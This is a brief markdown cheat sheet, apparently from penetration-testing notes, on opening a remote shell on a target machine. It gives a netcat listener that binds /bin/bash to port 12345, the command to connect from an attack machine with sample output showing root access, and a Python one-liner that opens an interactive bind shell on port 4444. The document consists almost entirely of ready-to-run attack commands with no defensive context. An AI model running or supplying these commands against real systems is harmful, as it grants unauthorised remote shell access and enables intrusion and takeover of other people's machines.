## Open a netcat connection on the target machine
Run the following command on the target machine:
```
nc.traditional -l -p 12345 -e /bin/bash
```

Now you can connect to it by running the following command from your attack machine:
```
nc {target_machine_ip} 12345
```
Example:
```
$ nc 192.168.232.131 12345
whoami
root
```

## Open a bind shell

Once you gain a foothold on the target machine you can run the following command to start a bind shell:
```
python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```
